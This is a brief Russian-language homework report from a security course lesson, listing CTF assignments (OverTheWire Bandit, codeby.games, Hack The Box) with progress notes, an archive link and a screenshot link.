> Пройти до 20 уровней на https://overthewire.org/wargames/bandit/bandit0.html
___

Пройдено 33 уровня

Уровни 20, 24, 25, 27, 33 Были пройдены при помощи подсказок.
 
[Архив](/Lesson_37/Bandit.7z)

___
> Решить на платформе codeby.games легкие задания и пройти вводное обучение 
___



___
> Решить любых 2 дополнительных CTF на любой платформе, результат – флаг 
___

Решены несколько заданий на платформе hackthebox.com

![Результат](/Lesson_37/ДЗ_37_1.png)

</details>

